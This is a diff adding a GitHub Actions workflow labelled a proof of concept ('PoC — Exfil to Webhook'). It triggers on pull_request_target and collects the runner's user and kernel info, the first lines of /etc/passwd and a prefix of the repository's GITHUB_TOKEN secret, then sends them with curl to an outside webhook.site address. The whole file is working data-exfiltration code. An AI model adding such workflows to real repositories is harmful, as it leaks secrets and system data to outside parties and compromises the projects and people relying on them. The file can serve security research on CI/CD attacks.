@@ -1,0 +1,25 @@
+name: PoC — Exfil to Webhook
+
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+  workflow_dispatch:
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Collect and exfiltrate data
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "[+] Running system info collection..."
+          WHOAMI=$(whoami)
+          UNAME=$(uname -a)
+          PASSWD=$(head -n 20 /etc/passwd)
+          TOKEN_PREFIX=$(echo "$GH_TOKEN" | cut -c1-8)
+
+          echo "[+] Sending results to webhook..."
+          curl -X POST -H "Content-Type: application/json" \
+            -d "{\"whoami\": \"$WHOAMI\", \"uname\": \"$UNAME\", \"passwd\": \"$PASSWD\", \"token_prefix\": \"$TOKEN_PREFIX\"}" \
+            https://webhook.site/d3dabef3-8bf1-41f6-ab7a-9f13e9ab646a
